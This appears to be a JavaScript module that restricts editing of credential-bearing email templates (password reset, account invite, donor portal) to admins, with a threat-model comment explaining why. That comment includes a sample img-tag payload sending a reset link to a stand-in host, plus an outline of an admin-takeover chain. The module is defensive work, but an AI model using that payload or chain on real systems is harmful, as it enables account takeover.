// =============================================================================
// credentialTemplates — admin-only editing for templates that carry account
// credentials.
//
// Some system templates are rendered with a live credential merged in:
//   password_reset             {{reset.url}}        — resets any account's password
//   user_account_created       {{invite.accept_url}} — claims an invited account
//   donor_portal_welcome       {{portal.temp_password}}
//   donor_portal_verify_email  {{portal.verify_url}}
//
// Template bodies are HTML the editor controls, and the merge renderer inserts
// values verbatim. Anyone who can edit one of these bodies can therefore leak
// the credential to themselves, e.g. with <img src="https://x/?t={{reset.url}}">.
// POST /api/auth/forgot-password is public, so for password_reset they can
// trigger that on demand for ANY account, including an admin's. Editing
// templates needs only `comms.templates.manage`, which can be granted to
// non-admin roles, so this would let a template editor take over an admin.
//
// Rearranging the email doesn't close this. If the server spliced the link into
// the rendered body instead, the editor still controls the HTML around it (an
// unclosed attribute, or CSS attribute selectors reading the href). So writes
// to these templates are restricted to admins, who can already impersonate any
// user. Nobody may create or rename a template onto one of these slugs.
//
// Slug equality has to follow MySQL, not JavaScript: the `slug` column's
// utf8mb4_unicode_ci / PAD SPACE collation treats 'Password_Reset ' and
// 'pässword_reset' as equal to 'password_reset', and renderBySlug() looks rows
// up with that same SQL equality. So the authoritative check,
// isCredentialTemplateId(), asks the database; normalizeSlug() is only a
// defence-in-depth mirror for slugs that are not yet in the table.
// =============================================================================

const CREDENTIAL_TEMPLATE_SLUGS = Object.freeze([
  'password_reset',
  'user_account_created',
  'donor_portal_welcome',
  'donor_portal_verify_email',
]);

/** Folds case, accents and trailing/leading whitespace, like a *_ci PAD SPACE collation. */
function normalizeSlug(slug) {
  return String(slug ?? '')
    .normalize('NFKD')
    .replace(/\p{M}/gu, '')
    .toLowerCase()
    .trim();
}

function isReservedTemplateSlug(slug) {
  const n = normalizeSlug(slug);
  return n !== '' && CREDENTIAL_TEMPLATE_SLUGS.includes(n);
}

function isAdminUser(user) {
  return Array.isArray(user?.roles) && user.roles.includes('admin');
}

/**
 * Is this template row one of the credential-bearing templates, according to
 * the database's own slug equality (the same equality renderBySlug uses)?
 */
async function isCredentialTemplateId(db, id) {
  const [[row]] = await db.query(
    'SELECT id FROM message_templates WHERE id = :id AND slug IN (:slugs) LIMIT 1',
    { id, slugs: CREDENTIAL_TEMPLATE_SLUGS }
  );
  return Boolean(row);
}

/**
 * Decide whether a template write is allowed. Pure: the caller supplies what
 * the database said about the target row.
 *
 * @param {object}  args
 * @param {object}  args.user               req.user
 * @param {'create'|'update'|'delete'} args.action
 * @param {boolean} [args.targetIsCredential] update/delete: isCredentialTemplateId() result
 * @param {string}  [args.requestedSlug]    create/update: the slug being saved
 * @returns {null | { status: number, error: string }}
 */
function credentialTemplateWriteError({ user, action, targetIsCredential = false, requestedSlug }) {
  if ((action === 'update' || action === 'delete') && targetIsCredential && !isAdminUser(user)) {
    return {
      status: 403,
      error: 'Only admins can change this template, because it contains account sign-in or password-reset links.',
    };
  }
  if ((action === 'create' || action === 'update') && !targetIsCredential && isReservedTemplateSlug(requestedSlug)) {
    return {
      status: 422,
      error: `The slug "${String(requestedSlug).trim()}" is reserved for a system email template.`,
    };
  }
  return null;
}

module.exports = {
  CREDENTIAL_TEMPLATE_SLUGS,
  normalizeSlug,
  isReservedTemplateSlug,
  isAdminUser,
  isCredentialTemplateId,
  credentialTemplateWriteError,
};
